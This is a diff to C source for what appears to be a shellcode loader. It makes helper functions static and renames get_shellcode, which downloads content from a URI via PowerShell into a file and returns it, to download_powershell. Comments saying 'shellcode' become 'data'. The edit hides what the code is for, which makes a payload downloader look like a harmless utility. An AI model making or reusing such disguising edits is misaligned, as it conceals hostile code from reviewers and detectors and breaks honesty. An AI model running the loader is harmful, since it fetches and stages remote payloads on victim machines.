@@ -7,7 +7,7 @@
 
 // Searches for the last occurence of the '/' character and returns the string remaining after that last occurence
 // Note that the return value will be pointing to the same string
-char *get_filename_from_url(char *url) 
+static char *get_filename_from_url(char *url) 
 {
     int index = -1;
     int i = 0;
@@ -25,7 +25,7 @@ char *get_filename_from_url(char *url)
 }
 
 
-int get_filesize(char *fvalue)
+static int get_filesize(char *fvalue)
 {
 	int size,rc1;
 	FILE *fp1 = fopen(fvalue, "rb");
@@ -47,7 +47,7 @@ int get_filesize(char *fvalue)
 
 // Returns pointer to buffer that contains the file content
 // Automatically allocates memory for this
-unsigned char *load_textfile(char *fvalue, int size)
+static unsigned char *load_textfile(char *fvalue, int size)
 {
 	#ifdef PRINT_DEBUG
 		printf("load_textfile called: fvalue: %s, size: %d\n", fvalue, size);
@@ -82,13 +82,13 @@ unsigned char *load_textfile(char *fvalue, int size)
 }
 
 
-// Downloads the shellcode from the URI specified in arg1 into a file.
-// The shellcode is then read from the file and returned.
+// Downloads data from the URI specified in arg1 into a file.
+// The data is then read from the file and returned.
 //
-// shellcode_size receives the size of the shellcode in bytes.
-unsigned char* get_shellcode(char *arg1, int *shellcode_size) {
+// data_size receives the size of the data in bytes.
+unsigned char* download_powershell(char *arg1, int *data_size) {
 	#ifdef PRINT_DEBUG
-		printf("download shellcode to file via powershell\n");
+		printf("download data to file via powershell\n");
 	#endif
 	
 	char sh_filename[128];
@@ -108,6 +108,6 @@ unsigned char* get_shellcode(char *arg1, int *shellcode_size) {
 		printf("download done\n");
 	#endif		
 	
-	*shellcode_size = get_filesize(sh_filename);	
-	return load_textfile(sh_filename, *shellcode_size);	
+	*data_size = get_filesize(sh_filename);	
+	return load_textfile(sh_filename, *data_size);	
 }
